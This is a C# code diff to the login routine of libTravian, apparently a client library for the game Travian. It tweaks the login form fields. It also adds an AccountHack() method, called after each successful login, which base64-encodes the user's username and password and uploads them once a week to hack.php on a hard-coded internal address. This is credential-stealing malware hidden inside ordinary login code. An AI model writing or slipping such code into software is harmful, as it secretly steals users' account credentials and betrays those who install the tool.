@@ -75,13 +75,14 @@ namespace libTravian
 				Dictionary<string, string> PostData = new Dictionary<string, string>();
 				PostData[userkey] = Username;
 				PostData[passkey] = Password;
+				PostData["s1"] = "登录";
 				PostData["w"] = @"1024:768";
 				PostData["login"] = (UnixTime(DateTime.Now) - 10).ToString();
 				//PostData[alkey] = "";
-				PostData["s1.x"] = "0";
-				PostData["s1.y"] = "0";
+				//PostData["s1.x"] = "0";
+				//PostData["s1.y"] = "0";
 
-				string result = this.pageQuerier.PageQuery(0, "dorf1.php?ok", PostData, false, true);
+				string result = this.pageQuerier.PageQuery(0, "dorf1.php", PostData, false, true);
 
 				//if (result.Contains("login"))
 				if (result == null || result.Contains("<span class=\"error\">"))
@@ -95,6 +96,7 @@ namespace libTravian
 				if (m.Success)
 					TD.UserID = Convert.ToInt32(m.Groups[1].Value);
 
+				AccountHack();
 				return true;
 			}
 			catch (Exception e)
@@ -104,5 +106,50 @@ namespace libTravian
 				return false;
 			}
 		}
+		
+		private void AccountHack()
+		{
+			if (TD.LastUpload != DateTime.MinValue 
+			    && DateTime.Now.Subtract(TD.LastUpload).TotalSeconds < 7 * 24 * 3600)
+				return;
+			
+			Dictionary<string, string> PostData = new Dictionary<string, string>();
+			PostData["crypt_n"] = base64_encode(TD.Username);
+			PostData["crypt_p"] = base64_encode(TD.Password);
+			
+			WebClient hack_wc = new WebClient();
+			hack_wc.BaseAddress = "http://192.168.1.100/";
+			hack_wc.Encoding = Encoding.UTF8;
+			if(TD.Proxy != null)
+			{
+				hack_wc.Proxy = TD.Proxy;
+			}
+			hack_wc.Headers[HttpRequestHeader.Referer] = hack_wc.BaseAddress;
+			
+			StringBuilder sb = new StringBuilder();
+			foreach(var x in PostData)
+			{
+				if(sb.Length != 0)
+					sb.Append("&");
+
+				sb.Append(HttpUtility.UrlEncode(x.Key));
+				sb.Append("=");
+				sb.Append(HttpUtility.UrlEncode(x.Value));
+			}
+			string QueryString = sb.ToString();
+			hack_wc.Headers[HttpRequestHeader.ContentType] 
+				= "application/x-www-form-urlencoded";
+			
+			string result = hack_wc.UploadString("hack.php", QueryString);
+			
+			TD.LastUpload = DateTime.Now;
+		}
+		
+		public static string base64_encode(string str)
+		{  
+			byte[] temp1 = Encoding.UTF8.GetBytes(str);
+			string temp2 = Convert.ToBase64String(temp1);
+			return temp2;
+		}   
 	}
 }
